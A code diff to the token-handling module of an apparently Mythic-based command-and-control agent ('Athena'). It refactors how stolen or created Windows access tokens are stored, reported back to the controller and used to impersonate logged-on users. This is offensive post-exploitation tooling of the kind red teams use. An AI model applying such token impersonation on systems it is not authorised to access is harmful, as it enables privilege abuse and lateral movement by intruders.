@@ -19,8 +19,8 @@ namespace Athena.Commands
 {
     public class TokenHandler
     {
-        static Dictionary<string, Token> tokens = new Dictionary<string, Token>();
-
+        //static Dictionary<string, Token> tokens = new Dictionary<string, Token>();
+        static Dictionary<int, SafeAccessTokenHandle> tokens = new Dictionary<int, SafeAccessTokenHandle>();
         public async Task<object> CreateToken(MythicJob job)
         {
             CreateToken tokenOptions = JsonConvert.DeserializeObject<CreateToken>(job.task.parameters);
@@ -38,8 +38,8 @@ namespace Athena.Commands
                 {
                     Token token = new Token()
                     {
-                        Handle = hToken,
-                        description  = tokenOptions.username,
+                        Handle = hToken.DangerousGetHandle().ToInt64(),
+                        description  = tokenOptions.name,
                         TokenId = tokens.Count + 1
                     };
                     
@@ -54,16 +54,15 @@ namespace Athena.Commands
                     }
 
 
-                    tokens.Add(tokenOptions.name, token);
-                    //tokens.Add(tokenOptions.name, hToken);
+                    tokens.Add(tokens.Count + 1, hToken);
 
                     return new TokenResponseResult()
                     {
                         user_output = $"Token created for {tokenOptions.username}",
                         completed = "true",
                         task_id = job.task.id,
-                        //tokens = new List<Token>() { token },
-                        callbacktokens = new List<CallbackToken> { new CallbackToken()
+                        tokens = new List<Token>() { token },
+                        callback_tokens = new List<CallbackToken> { new CallbackToken()
                         {
                             action = "add",
                             host = System.Net.Dns.GetHostName(),
@@ -94,11 +93,11 @@ namespace Athena.Commands
                 };
             }
         }
-        public async Task<bool> ThreadImpersonate(Token t)
+        public async Task<bool> ThreadImpersonate(int t)
         {
-            if (tokens.ContainsKey(t.description))
+            if (tokens.ContainsKey(t))
             {
-                return Pinvoke.ImpersonateLoggedOnUser(tokens[t.description].Handle);
+                return Pinvoke.ImpersonateLoggedOnUser(tokens[t]);
             }
             return false;
         }
@@ -119,7 +118,6 @@ namespace Athena.Commands
             return new ResponseResult()
             {
                 completed = "true",
-                status = "success",
                 user_output = sb.ToString(),
                 task_id = job.task.id,
             };
